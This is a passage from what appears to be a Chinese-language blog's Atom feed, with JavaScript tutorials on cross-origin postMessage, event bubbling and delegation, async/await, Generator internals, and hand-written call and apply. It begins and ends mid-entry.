表示二级域名都相同就可以实现跨域。</p><blockquote><p>四、postMessage</p></blockquote><p>这种方式通常用于获取嵌入页面中的第三方页面数据。一个页面发送消息，另一个页面判断来源并接收消息<br><figure class="highlight typescript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// 发送消息端</span></div><div class="line"><span class="built_in">window</span>.parent.postMessage(<span class="string">'message'</span>, <span class="string">'http://test.com'</span>);</div><div class="line"><span class="comment">// 接收消息端</span></div><div class="line"><span class="keyword">var</span> mc = <span class="keyword">new</span> MessageChannel();</div><div class="line">mc.addEventListener(<span class="string">'message'</span>, <span class="function">(<span class="params">event</span>) =&gt;</span> &#123;</div><div class="line">    <span class="keyword">var</span> origin = event.origin || event.originalEvent.origin; </div><div class="line">    <span class="keyword">if</span> (origin === <span class="string">'http://test.com'</span>) &#123;</div><div class="line">        <span class="built_in">console</span>.log(<span class="string">'验证通过'</span>)</div><div class="line">    &#125;</div><div class="line">&#125;);</div></pre></td></tr></table></figure></p><h2 id="★30s总结"><a href="#★30s总结" class="headerlink" title="★30s总结"></a>★30s总结</h2><ul><li><code>JSONP</code> : 利用 <code>&lt;script&gt;</code> 标签的漏洞来跨域；</li><li><code>CORS</code>：服务端和后端，后端是关键</li><li><code>document.domian</code> ： 二级域名相同</li><li><code>postMessage</code> ： 一个页面发送，另一个页面接收并验证</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;浏览器出于安全的考虑，采用的是同源策略。&lt;/p&gt;
&lt;p&gt;协议、域名和端口号三者统一，就是同域，只要有其中一个不一样，就是跨域，这时Ajax就会请求失败。&lt;/p&gt;
&lt;p&gt;下面有三种方法可以解决跨域的问题&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>事件机制</title>
    <link href="wangsiyuan233.github.io/2018/09/11/71%E4%BA%8B%E4%BB%B6%E6%9C%BA%E5%88%B6/"/>
    <id>wangsiyuan233.github.io/2018/09/11/71事件机制/</id>
    <published>2018-09-11T14:48:17.000Z</published>
    <updated>2018-09-12T02:17:18.125Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>一、事件触发</p></blockquote><ol><li><code>window</code> 到 触发处 的途中，碰到了 捕获 就会触发</li><li>到了 触发处，肯定也会激活啊</li><li>从 触发处 往 <code>window</code> 传播，碰到了 冒泡 就会触发</li></ol><a id="more"></a><p>一般情况下都是按照上面三个步骤发展，如果一个事件同时有 冒泡和捕获，那就按照发生的顺序来<br><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">node.addEventListener(<span class="string">'click'</span>,<span class="function"><span class="params">(event)</span> =&gt;</span>&#123;</div><div class="line"><span class="built_in">console</span>.log(<span class="string">'冒泡'</span>)</div><div class="line">&#125;,<span class="literal">false</span>);</div><div class="line">node.addEventListener(<span class="string">'click'</span>,<span class="function"><span class="params">(event)</span> =&gt;</span>&#123;</div><div class="line"><span class="built_in">console</span>.log(<span class="string">'捕获 '</span>)</div><div class="line">&#125;,<span class="literal">true</span>)</div><div class="line"></div><div class="line"><span class="regexp">//</span> 冒泡 捕获</div></pre></td></tr></table></figure></p><blockquote><p>二、注册事件</p></blockquote><p>我们用 addEventListener 注册事件，这个函数的第三个参数可以是 布尔值useCapture，也可以是对象</p><ul><li>参数为 布尔值useCapture 时，默认的是 false，即 冒泡事件。</li><li>参数为对象时，省略。</li></ul><p>我们希望事件到了触发处就停止了，这时可以使用 stopPropagation 来阻止进一步传播：</p><ul><li><code>stopPropagation</code> 不仅可以阻止冒泡，也可以阻止捕获</li><li><code>stopImmediatePropagation</code> 更强，在上面基础上，还可以阻止除了当前事件的其他事件注册<figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">node.addEventListener(<span class="string">'click'</span>,<span class="function"><span class="params">(event)</span> =&gt;</span>&#123;</div><div class="line">event.stopImmediatePropagation()</div><div class="line"><span class="built_in">console</span>.log(<span class="string">'冒泡'</span>)</div><div class="line">&#125;,<span class="literal">false</span>);</div><div class="line"><span class="regexp">//</span> 点击 node 只会执行上面的函数，该函数不会执行</div><div class="line">node.addEventListener(<span class="string">'click'</span>,<span class="function"><span class="params">(event)</span> =&gt;</span> &#123;</div><div class="line"><span class="built_in">console</span>.log(<span class="string">'捕获 '</span>)</div><div class="line">&#125;,<span class="literal">true</span>)</div></pre></td></tr></table></figure></li></ul><blockquote><p>三、事件代理</p></blockquote><p>如果一个节点中的子节点是动态生成的，那么子节点需要注册事件的话应该注册在父节点上。<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">ul</span> <span class="attr">id</span>=<span class="string">"ul"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>1<span class="tag">&lt;/<span class="name">li</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>2<span class="tag">&lt;/<span class="name">li</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>3<span class="tag">&lt;/<span class="name">li</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>4<span class="tag">&lt;/<span class="name">li</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>5<span class="tag">&lt;/<span class="name">li</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></div><div class="line"><span class="keyword">let</span> ul = <span class="built_in">document</span>.querySelector(<span class="string">'#ul'</span>)</div><div class="line">ul.addEventListener(<span class="string">'click'</span>, (event) =&gt; &#123;</div><div class="line"><span class="built_in">console</span>.log(event.target);</div><div class="line">&#125;)</div><div class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div></pre></td></tr></table></figure></p><p>事件代理的优点：</p><ul><li>节省内存</li><li>不需要给子节点注销事件</li></ul><h2 id="30s总结"><a href="#30s总结" class="headerlink" title="30s总结"></a>30s总结</h2><ul><li>事件机制 <code>addEventListener</code> 分三步走: 捕获、触发和冒泡</li><li><code>stopPropagation</code> 和 <code>stopImmediatePropagation</code> 都可以阻止触发</li><li>动态的子节点，需要去父节点上触发</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;一、事件触发&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;window&lt;/code&gt; 到 触发处 的途中，碰到了 捕获 就会触发&lt;/li&gt;
&lt;li&gt;到了 触发处，肯定也会激活啊&lt;/li&gt;
&lt;li&gt;从 触发处 往 &lt;code&gt;window&lt;/code&gt; 传播，碰到了 冒泡 就会触发&lt;/li&gt;
&lt;/ol&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>深入理解JavaScript--异步系列(4)</title>
    <link href="wangsiyuan233.github.io/2018/08/23/70%E5%BC%82%E6%AD%A5%E7%B3%BB%E5%88%97-4/"/>
    <id>wangsiyuan233.github.io/2018/08/23/70异步系列-4/</id>
    <published>2018-08-23T11:41:21.000Z</published>
    <updated>2018-09-13T12:18:12.940Z</updated>
    
    <content type="html"><![CDATA[<h2 id="async-和-await"><a href="#async-和-await" class="headerlink" title="async 和 await"></a>async 和 await</h2><p>async 和 await<br>1、一个函数如果加上 <code>async</code> ，那么该函数就会返回一个 <code>Promise</code><br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>) </span>&#123;</div><div class="line">  <span class="keyword">return</span> <span class="string">"1"</span>;</div><div class="line">&#125;</div><div class="line"><span class="built_in">console</span>.log(test()); <span class="comment">// -&gt; Promise &#123;&lt;resolved&gt;: "1"&#125;</span></div></pre></td></tr></table></figure></p><p>可以把 <code>async</code> 看成将函数返回值使用 <code>Promise.resolve()</code> 包裹了下<br><a id="more"></a><br>2、<code>await</code> 只能在 <code>async</code> 函数中使用<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">sleep</span>(<span class="params"></span>) </span>&#123;</div><div class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="params">resolve</span> =&gt;</span> &#123;</div><div class="line">    setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</div><div class="line">      <span class="built_in">console</span>.log(<span class="string">'finish'</span>)</div><div class="line">      resolve(<span class="string">"sleep"</span>);</div><div class="line">    &#125;, <span class="number">2000</span>);</div><div class="line">  &#125;);</div><div class="line">&#125;</div><div class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>) </span>&#123;</div><div class="line">  <span class="keyword">let</span> value = <span class="keyword">await</span> sleep();</div><div class="line">  <span class="built_in">console</span>.log(<span class="string">"object"</span>);</div><div class="line">&#125;</div><div class="line">test()</div></pre></td></tr></table></figure></p><p>上面代码会先打印 <code>finish</code> 然后再打印 <code>object</code> 。因为 <code>await</code> 会等待 <code>sleep</code> 函数 <code>resolve</code> ，<strong>所以即使后面是同步代码，也不会先去执行同步代码再来执行异步代码。</strong></p><p><code>async</code> 和 <code>await</code> 相比直接使用 <code>Promise</code> 来说，优势在于处理 <code>then</code> 的调用链，能够更清晰准确的写出代码。缺点在于滥用 <code>await</code> 可能会导致性能问题，因为 <code>await</code> 会阻塞代码，也许之后的异步代码并不依赖于前者，但仍然需要等待前者完成，导致代码失去了并发性。</p><p>下面来看一个使用 <code>await</code> 的代码:<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">var</span> <span class="selector-tag">a</span> = <span class="number">0</span></div><div class="line"><span class="selector-tag">var</span> <span class="selector-tag">b</span> = async () =&gt; &#123;</div><div class="line">  <span class="selector-tag">a</span> = <span class="selector-tag">a</span> + await <span class="number">10</span></div><div class="line">  console.log(<span class="string">'2'</span>, a) <span class="comment">// -&gt; '2' 10</span></div><div class="line">  <span class="selector-tag">a</span> = (await <span class="number">10</span>) + <span class="selector-tag">a</span></div><div class="line">  console.log(<span class="string">'3'</span>, a) <span class="comment">// -&gt; '3' 20</span></div><div class="line">&#125;</div><div class="line"><span class="function"><span class="title">b</span><span class="params">()</span></span></div><div class="line">a++</div><div class="line">console.log(<span class="string">'1'</span>, a) <span class="comment">// -&gt; '1' 1</span></div></pre></td></tr></table></figure></p><p>对于以上代码你可能会有疑惑，这里说明下原理</p><ul><li>首先函数 b 先执行，在执行到 <code>await 10</code> 之前变量 <code>a</code> 还是 0，因为在 <code>await</code> 内部实现了 <code>generators</code> ，<code>generators</code> 会保留堆栈中东西，所以这时候 <code>a = 0</code> 被保存了下来</li><li>因为 <code>await</code> 是异步操作，所以会先执行 <code>console.log(&#39;1&#39;, a)</code></li><li>这时候同步代码执行完毕，开始执行异步代码，将保存下来的值拿出来使用，这时候 <code>a = 10</code></li><li>然后后面就是常规执行代码了</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;async-和-await&quot;&gt;&lt;a href=&quot;#async-和-await&quot; class=&quot;headerlink&quot; title=&quot;async 和 await&quot;&gt;&lt;/a&gt;async 和 await&lt;/h2&gt;&lt;p&gt;async 和 await&lt;br&gt;1、一个函数如果加上 &lt;code&gt;async&lt;/code&gt; ，那么该函数就会返回一个 &lt;code&gt;Promise&lt;/code&gt;&lt;br&gt;&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;async&lt;/span&gt; &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;test&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;1&quot;&lt;/span&gt;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;console&lt;/span&gt;.log(test()); &lt;span class=&quot;comment&quot;&gt;// -&amp;gt; Promise &amp;#123;&amp;lt;resolved&amp;gt;: &quot;1&quot;&amp;#125;&lt;/span&gt;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;可以把 &lt;code&gt;async&lt;/code&gt; 看成将函数返回值使用 &lt;code&gt;Promise.resolve()&lt;/code&gt; 包裹了下&lt;br&gt;
    
    </summary>
    
    
      <category term="异步" scheme="wangsiyuan233.github.io/tags/%E5%BC%82%E6%AD%A5/"/>
    
  </entry>
  
  <entry>
    <title>深入理解JavaScript--异步系列(3)</title>
    <link href="wangsiyuan233.github.io/2018/08/23/69%E5%BC%82%E6%AD%A5%E7%B3%BB%E5%88%97-3/"/>
    <id>wangsiyuan233.github.io/2018/08/23/69异步系列-3/</id>
    <published>2018-08-23T03:03:01.000Z</published>
    <updated>2018-08-24T17:50:56.172Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Generator-实现"><a href="#Generator-实现" class="headerlink" title="Generator 实现"></a>Generator 实现</h2><p>Generator 是 ES6 中新增的语法，和 Promise 一样，都可以用来异步编程<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// 使用 * 表示这是一个 Generator 函数</span></div><div class="line"><span class="comment">// 内部可以通过 yield 暂停代码</span></div><div class="line"><span class="comment">// 通过调用 next 恢复执行</span></div><div class="line"><span class="function"><span class="keyword">function</span>* <span class="title">test</span>(<span class="params"></span>) </span>&#123;</div><div class="line">  <span class="keyword">let</span> a = <span class="number">1</span> + <span class="number">2</span>;</div><div class="line">  <span class="keyword">yield</span> <span class="number">2</span>;</div><div class="line">  <span class="keyword">yield</span> <span class="number">3</span>;</div><div class="line">&#125;</div><div class="line"><span class="keyword">let</span> b = test();</div><div class="line"><span class="built_in">console</span>.log(b.next()); <span class="comment">// &gt;  &#123; value: 2, done: false &#125;</span></div><div class="line"><span class="built_in">console</span>.log(b.next()); <span class="comment">// &gt;  &#123; value: 3, done: false &#125;</span></div><div class="line"><span class="built_in">console</span>.log(b.next()); <span class="comment">// &gt;  &#123; value: undefined, done: true &#125;</span></div></pre></td></tr></table></figure></p><a id="more"></a><p>从以上代码可以发现，加上 <code>*</code> 的函数执行后拥有了 <code>next</code> 函数，也就是说函数执行后返回了一个对象。每次调用 <code>next</code> 函数可以继续执行被暂停的代码。</p><p>以下是 <code>Generator</code> 函数的简单实现:<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// cb 也就是编译过的 test 函数</span></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">generator</span>(<span class="params">cb</span>) </span>&#123;</div><div class="line">  <span class="keyword">return</span> (<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="keyword">var</span> object = &#123;</div><div class="line">      <span class="attr">next</span>: <span class="number">0</span>,</div><div class="line">      <span class="attr">stop</span>: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;&#125;</div><div class="line">    &#125;;</div><div class="line"></div><div class="line">    <span class="keyword">return</span> &#123;</div><div class="line">      <span class="attr">next</span>: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">        <span class="keyword">var</span> ret = cb(object);</div><div class="line">        <span class="keyword">if</span> (ret === <span class="literal">undefined</span>) <span class="keyword">return</span> &#123; <span class="attr">value</span>: <span class="literal">undefined</span>, <span class="attr">done</span>: <span class="literal">true</span> &#125;;</div><div class="line">        <span class="keyword">return</span> &#123;</div><div class="line">          <span class="attr">value</span>: ret,</div><div class="line">          <span class="attr">done</span>: <span class="literal">false</span></div><div class="line">        &#125;;</div><div class="line">      &#125;</div><div class="line">    &#125;;</div><div class="line">  &#125;)();</div><div class="line">&#125;</div><div class="line"><span class="comment">// 如果你使用 babel 编译后可以发现 test 函数变成了这样</span></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>) </span>&#123;</div><div class="line">  <span class="keyword">var</span> a;</div><div class="line">  <span class="keyword">return</span> generator(<span class="function"><span class="keyword">function</span>(<span class="params">_context</span>) </span>&#123;</div><div class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</div><div class="line">      <span class="keyword">switch</span> ((_context.prev = _context.next)) &#123;</div><div class="line">        <span class="comment">// 可以发现通过 yield 将代码分割成几块</span></div><div class="line">        <span class="comment">// 每次执行 next 函数就执行一块代码</span></div><div class="line">        <span class="comment">// 并且表明下次需要执行哪块代码</span></div><div class="line">        <span class="keyword">case</span> <span class="number">0</span>:</div><div class="line">          a = <span class="number">1</span> + <span class="number">2</span>;</div><div class="line">          _context.next = <span class="number">4</span>;</div><div class="line">          <span class="keyword">return</span> <span class="number">2</span>;</div><div class="line">        <span class="keyword">case</span> <span class="number">4</span>:</div><div class="line">          _context.next = <span class="number">6</span>;</div><div class="line">          <span class="keyword">return</span> <span class="number">3</span>;</div><div class="line"><span class="comment">// 执行完毕</span></div><div class="line">        <span class="keyword">case</span> <span class="number">6</span>:</div><div class="line">        <span class="keyword">case</span> <span class="string">"end"</span>:</div><div class="line">          <span class="keyword">return</span> _context.stop();</div><div class="line">      &#125;</div><div class="line">    &#125;</div><div class="line">  &#125;);</div></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Generator-实现&quot;&gt;&lt;a href=&quot;#Generator-实现&quot; class=&quot;headerlink&quot; title=&quot;Generator 实现&quot;&gt;&lt;/a&gt;Generator 实现&lt;/h2&gt;&lt;p&gt;Generator 是 ES6 中新增的语法，和 Promise 一样，都可以用来异步编程&lt;br&gt;&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;// 使用 * 表示这是一个 Generator 函数&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;// 内部可以通过 yield 暂停代码&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;// 通过调用 next 恢复执行&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt;* &lt;span class=&quot;title&quot;&gt;test&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;let&lt;/span&gt; a = &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt; + &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;yield&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;yield&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;let&lt;/span&gt; b = test();&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;console&lt;/span&gt;.log(b.next()); &lt;span class=&quot;comment&quot;&gt;// &amp;gt;  &amp;#123; value: 2, done: false &amp;#125;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;console&lt;/span&gt;.log(b.next()); &lt;span class=&quot;comment&quot;&gt;// &amp;gt;  &amp;#123; value: 3, done: false &amp;#125;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;console&lt;/span&gt;.log(b.next()); &lt;span class=&quot;comment&quot;&gt;// &amp;gt;  &amp;#123; value: undefined, done: true &amp;#125;&lt;/span&gt;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="异步" scheme="wangsiyuan233.github.io/tags/%E5%BC%82%E6%AD%A5/"/>
    
  </entry>
  
  <entry>
    <title>聊聊系列(6)-- call, apply, bind 区别</title>
    <link href="wangsiyuan233.github.io/2018/08/23/68%E8%81%8A%E8%81%8A%E7%B3%BB%E5%88%97-6/"/>
    <id>wangsiyuan233.github.io/2018/08/23/68聊聊系列-6/</id>
    <published>2018-08-23T02:23:07.000Z</published>
    <updated>2018-08-23T17:58:31.454Z</updated>
    
    <content type="html"><![CDATA[<p><a href="http://wangsiyuan233.cn/2018/03/04/27%E8%81%8A%E8%81%8A%E7%B3%BB%E5%88%97-2/" target="_blank" rel="external">【【【this 实例-第9条】】】</a></p><blockquote><p>一、 call 和 apply 的异同</p></blockquote><p><code>call</code> 和 <code>apply</code> 都是为了解决改变 <code>this</code> 的指向。作用都是相同的，只是传参的方式不同。</p><p>除了第一个参数外，<code>call</code> 可以接收一个参数列表，<code>apply</code> 只接受一个参数数组。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">let</span> a = &#123;</div><div class="line">    <span class="attr">value</span>: <span class="number">1</span></div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">getValue</span>(<span class="params">name, age</span>) </span>&#123;</div><div class="line">    <span class="built_in">console</span>.log(name)</div><div class="line">    <span class="built_in">console</span>.log(age)</div><div class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span>.value)</div><div class="line">&#125;</div><div class="line">getValue.call(a, <span class="string">'yck'</span>, <span class="string">'24'</span>)</div><div class="line">getValue.apply(a, [<span class="string">'yck'</span>, <span class="string">'24'</span>])</div></pre></td></tr></table></figure></p><a id="more"></a><blockquote><p>二、自己动手实现</p></blockquote><p>可以从以下几点来考虑如何实现</p><ul><li>不传入第一个参数，那么默认为 <code>window</code></li><li>改变了 <code>this</code> 指向，让新的对象可以执行该函数。那么思路是否可以变成给新的对象添加一个函数，然后在执行完以后删除？</li></ul><p>1、call 的思路<br><figure class="highlight verilog"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">Function<span class="variable">.prototype</span><span class="variable">.myCall</span> = <span class="keyword">function</span> (<span class="keyword">context</span>) &#123;</div><div class="line">  <span class="keyword">var</span> <span class="keyword">context</span> = <span class="keyword">context</span> || window</div><div class="line">  <span class="comment">// 给 context 添加一个属性</span></div><div class="line">  <span class="comment">// getValue.call(a, 'yck', '24') =&gt; a.fn = getValue</span></div><div class="line">  <span class="keyword">context</span><span class="variable">.fn</span> = <span class="keyword">this</span></div><div class="line">  <span class="comment">// 将 context 后面的参数取出来</span></div><div class="line">  <span class="keyword">var</span> args = [..<span class="variable">.arguments</span>]<span class="variable">.slice</span>(<span class="number">1</span>)</div><div class="line">  <span class="comment">// getValue.call(a, 'yck', '24') =&gt; a.fn('yck', '24')</span></div><div class="line">  <span class="keyword">var</span> result = <span class="keyword">context</span><span class="variable">.fn</span>(..<span class="variable">.args</span>)</div><div class="line">  <span class="comment">// 删除 fn</span></div><div class="line">  delete <span class="keyword">context</span><span class="variable">.fn</span></div><div class="line">  <span class="keyword">return</span> result</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>2、apply 的思路<br><figure class="highlight verilog"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">Function<span class="variable">.prototype</span><span class="variable">.myApply</span> = <span class="keyword">function</span> (<span class="keyword">context</span>) &#123;</div><div class="line">  <span class="keyword">var</span> <span class="keyword">context</span> = <span class="keyword">context</span> || window</div><div class="line">  <span class="keyword">context</span><span class="variable">.fn</span> = <span class="keyword">this</span></div><div class="line"></div><div class="line">  <span class="keyword">var</span> result</div><div class="line">  <span class="comment">// 需要判断是否存储第二个参数</span></div><div class="line">  <span class="comment">// 如果存在，就将第二个参数展开</span></div><div class="line">  <span class="keyword">if</span> (arguments[<span class="number">1</span>]) &#123;</div><div class="line">    result = <span class="keyword">context</span><span class="variable">.fn</span>(..<span class="variable">.arguments</span>[<span class="number">1</span>])</div><div class="line">  &#125; <span class="keyword">else</span> &#123;</div><div class="line">    result = <span class="keyword">context</span><span class="variable">.fn</span>()</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  delete <span class="keyword">context</span><span class="variable">.fn</span></div><div class="line">  <span class="keyword">return</span> result</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>3、bind 的思路</p><p>bind 和其他两个方法作用也是一致的，只是该方法会返回一个函数。并且我们可以通过 bind 实现柯里化。<br><figure class="highlight javascript"><table><tr><td 